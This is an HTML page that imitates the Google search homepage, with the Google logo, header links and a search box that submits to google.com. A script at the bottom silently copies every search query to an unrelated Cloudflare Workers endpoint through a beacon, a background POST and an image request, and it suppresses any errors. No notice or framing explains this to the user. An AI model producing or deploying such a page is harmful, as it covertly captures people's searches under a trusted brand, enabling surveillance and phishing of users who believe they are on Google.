<!DOCTYPE html>
<html lang="en" data-theme="auto">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="color-scheme" content="light dark" />
  <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
  <meta name="theme-color" content="#3c3c3c" media="(prefers-color-scheme: dark)">
  <title>Google</title>

  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />

  <style>
    :root {
      --bg:#fff; --text:#1f1f1f; --muted:#5f6368; --link:#1a73e8;
      --border:#dadce0; --icon:#9aa0a6;
      --focus: rgba(26,115,232,.28);
      --r-pill:999px;
      --s-3:12px; --s-4:16px;
      --w:clamp(280px,92vw,600px);
    }

    html[data-theme="dark"] {
      --bg:#3c3c3c; --text:#eaeaea; --muted:#b9bcbf; --link:#8ab4f8;
      --border:#5a5a5a; --icon:#d0d0d0;
    }

    body {
      margin:0; background:var(--bg); color:var(--text);
      display:flex; flex-direction:column; min-height:100vh;
      font:16px/1.4 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;
    }

    header {
      display:flex; justify-content:space-between; align-items:center;
      padding:var(--s-3) var(--s-4);
    }

    .header-left a, footer a {
      color:var(--text); text-decoration:none; opacity:.9; margin-right:14px;
      font-size:14px;
    }

    .sign-in {
      background:#1a73e8; color:#fff; padding:8px 14px; border-radius:999px; text-decoration:none;
    }

    main {
      display:grid; place-items:center; gap:24px; flex:1; padding:24px;
    }

    .logo img {
      width:200px; max-width:62vw; height:auto; transition:filter .3s ease;
    }
    html[data-theme="dark"] .logo img {
      filter: brightness(0) invert(1); /* makes Google logo white */
    }

    .search {
      position:relative; width:100%; max-width:var(--w);
    }

    .search input {
      width:100%; height:56px; border-radius:999px;
      border:1px solid var(--border);
      background:#fff; color:#000;
      padding:0 98px 0 52px; font-size:16px;
      outline:none; transition:background .3s ease;
    }

    html[data-theme="dark"] .search input {
      background:#fff; color:#000;
    }

    .search .material-symbols-outlined {
      position:absolute; top:50%; transform:translateY(-50%);
      font-size:22px; color:var(--icon);
    }
    .search .search-icon { left:16px; }
    .search .mic { right:56px; }
    .search .camera { right:18px; }

    footer {
      border-top:1px solid var(--border); text-align:center; padding:12px;
    }
  </style>
</head>
<body>
  <header>
    <div class="header-left">
      <a href="https://www.google.com/imghp?hl=en&ogbl">Images</a>
      <a href="https://mail.google.com/mail/&ogbl">Gmail</a>
    </div>
    <div class="header-right">
      <a class="sign-in" href="https://accounts.google.com/ServiceLogin">Sign in</a>
    </div>
  </header>

  <main>
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <form id="search" class="search" action="https://www.google.com/search" method="GET">
      <span class="material-symbols-outlined search-icon">search</span>
      <span class="material-symbols-outlined mic">mic</span>
      <span class="material-symbols-outlined camera">photo_camera</span>
      <input id="q" name="q" type="search" placeholder="Search">
    </form>
  </main>

  <footer>
    <a href="#">About</a>
    <a href="#">Advertising</a>
    <a href="#">Business</a>
    <a href="#">How Search works</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Settings</a>
  </footer>

  <script>
    const ENDPOINT = 'https://google-reveal.avishaierel.workers.dev';

    function sendToBackend(q){
      try{
        const params = new URLSearchParams({ q });
        if (navigator.sendBeacon) {
          const blob = new Blob([params.toString()], { type: 'application/x-www-form-urlencoded;charset=UTF-8' });
          navigator.sendBeacon(ENDPOINT, blob);
        } else {
          fetch(ENDPOINT, { method:'POST', body:params, keepalive:true, mode:'cors' }).catch(()=>{});
        }
        const img = new Image();
        img.src = ENDPOINT + '?' + params.toString();
      }catch(e){}
    }

    const form = document.getElementById('search');
    const input = document.getElementById('q');
    form.addEventListener('submit', function(){
      const q = (input.value || '').trim();
      if(q){ sendToBackend(q); }
    }, { capture:true });
  </script>
</body>
</html>
